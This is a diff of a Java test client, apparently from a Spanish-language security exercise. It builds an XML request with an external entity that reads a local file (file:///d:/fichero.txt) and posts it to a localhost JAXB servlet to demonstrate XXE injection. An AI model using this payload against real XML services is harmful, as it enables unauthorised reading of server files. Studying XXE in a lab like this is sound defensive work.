@@ -17,14 +17,14 @@ public class _03_Prueba_JAXB {
 	public static void main(String[] args) {
 
 		String xml = "<?xml version=\"1.0\" encoding=\"utf-8\"?>" +
-					 "<!DOCTYPE foo [ " +
-					 "<!ELEMENT foo ANY > " +
-					 "<!ENTITY xxe SYSTEM \"file:///d:/fichero.txt\" >]>" +
-					 "<cliente>"+
-					 	"<nombre>&xxe;</nombre>"+
-					 	"<direccion>bbb</direccion>"+
-					 	"<telefono>ccc</telefono>"+
-					 "</cliente>";
+				 "<!DOCTYPE foo [ " +
+				 "	<!ENTITY xxe SYSTEM \"file:///d:/fichero.txt\" >"+
+				 "]>" +
+				 "<cliente>"+
+				 	"<nombre>&xxe;</nombre>"+
+				 	"<direccion>bbb</direccion>"+
+				 	"<telefono>ccc</telefono>"+
+				 "</cliente>";
 
 		StringEntity entity = new StringEntity(xml, ContentType.create("text/xml", Consts.UTF_8));
 		HttpPost httpPost = new HttpPost("http://localhost:8080/Ej06_XXE/JAXBServlet");
